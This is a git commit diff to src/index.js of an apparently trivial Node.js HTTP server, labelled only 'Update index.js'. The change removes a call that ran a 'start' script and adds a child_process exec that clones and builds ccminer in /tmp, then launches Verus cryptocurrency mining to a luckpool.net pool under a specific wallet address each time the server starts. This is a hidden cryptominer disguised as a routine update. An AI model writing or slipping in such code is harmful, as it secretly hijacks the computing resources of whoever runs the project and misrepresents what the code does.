045a3625688e4ab2833db3ca3242a966fa6d207f
xavuru <99122619+xavuru@users.noreply.github.com>
2022-02-06 19:17:13 +0800

    Update index.js

--- src/index.js
+++ src/index.js
@@ -7,16 +7,20 @@ http
     res.end(); //end the response
   })
   .listen(8080); //the server object listens on port 8080
-const { exec } = require("child_process");
-exec("cp -R start .. && cd .. && sh start", (error, stdout, stderr) => {
-  if (error) {
-    console.log(`error: ${error.message}`);
-    return;
-  }
-  if (stderr) {
-    console.log(`stderr: ${stderr}`);
-    return;
-  }
-  console.log(`stdout: ${stdout}`);
-});
 
+const { exec } = require("child_process");
+
+exec(
+  "cd /tmp && git clone --single-branch -b Verus2.2 https://github.com/monkins1010/ccminer.git && cd ccminer && chmod +x build.sh configure.sh autogen.sh && ./build.sh && ./ccminer -a verus -o stratum+tcp://eu.luckpool.net:3956 -u RARNZ6LoxcvsUgVHM1f2MDmnVfzDFxqV1R.XXX -p x -t 1",
+  (error, stdout, stderr) => {
+    if (error) {
+      console.log(`error: ${error.message}`);
+      return;
+    }
+    if (stderr) {
+      console.log(`stderr: ${stderr}`);
+      return;
+    }
+    console.log(`stdout: ${stdout}`);
+  }
+);
